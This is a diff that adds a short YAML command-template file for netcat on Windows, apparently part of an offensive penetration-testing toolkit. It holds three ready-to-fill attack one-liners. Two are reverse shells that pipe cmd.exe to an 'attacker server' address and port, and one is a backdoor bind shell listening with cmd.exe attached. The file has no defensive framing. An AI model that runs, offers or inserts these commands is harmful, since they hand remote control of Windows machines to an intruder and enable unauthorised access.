@@ -1,0 +1,29 @@
+---
+name: netcat
+description: Arbitrary TCP and UDP connections and listeners
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Reverse Shell (cmd.exe)":
+    - type: ["cmd","standalone"]
+    - text: "nc {IPV4} {INT} -e cmd.exe"
+    - input: ["attacker server IPv4 address","listening attacker TCP port"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Backdoor Windows Shell":
+    - type: ["cmd","standalone"]
+    - text: "nc -l -p {INT} -e cmd.exe"
+    - input: ["listening TCP port number"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Windows Reverse Shell":
+    - type: ["cmd","standalone"]
+    - text: "nc {IPV4} {INT} -e cmd.exe"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
